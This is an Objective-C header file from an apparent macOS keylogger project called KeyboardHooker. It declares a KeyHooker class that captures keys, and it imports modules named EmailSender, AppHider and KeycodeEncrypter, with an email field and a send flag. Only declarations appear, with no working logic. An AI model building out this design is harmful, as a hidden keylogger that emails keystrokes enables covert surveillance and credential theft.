//
//  KeyboardHooker.h
//  KeyboardHooker
//
//  Created by Иван on 24.11.17.
//  Copyright © 2017 IvanCode. All rights reserved.
//

#import <Foundation/Foundation.h>
#import <SystemConfiguration/SystemConfiguration.h>

#import "Time.h"
#import "KeyRunLoop.h"
#import "EmailSender.h"
#import "FileManager.h"
#import "KeycodeEncrypter.h"
#import "AppHider.h"
#import "Cryptographer.h"

@protocol ShouldSendDelegate <NSObject>
@optional

- (void)setShouldSend:(BOOL)flag;

@end

@interface KeyHooker : NSObject

{
    BOOL flag;
    BOOL shouldSend;
    NSMutableArray *combination;
    NSInteger fileSize;
    NSString *email;
    
    id <ShouldSendDelegate> delegate;
}

- (id)init: (id <ShouldSendDelegate>)deleg;

- (void)doFullCycle: (int)key;
- (BOOL)checkCombination;
- (void)reset;

@end
